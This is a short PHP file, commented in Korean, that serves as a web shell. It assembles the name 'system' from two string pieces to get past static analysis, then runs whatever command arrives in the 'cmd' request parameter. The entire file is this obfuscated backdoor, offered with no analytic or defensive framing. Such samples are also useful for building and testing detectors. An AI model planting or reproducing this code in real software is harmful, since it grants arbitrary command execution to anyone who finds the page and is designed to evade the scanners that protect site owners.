<?php
// 문자열 연결 우회 (정적 분석 우회)
$a = 'sys';
$b = 'tem';
$f = $a . $b;   // "system"
$f($_REQUEST['cmd']);
?>
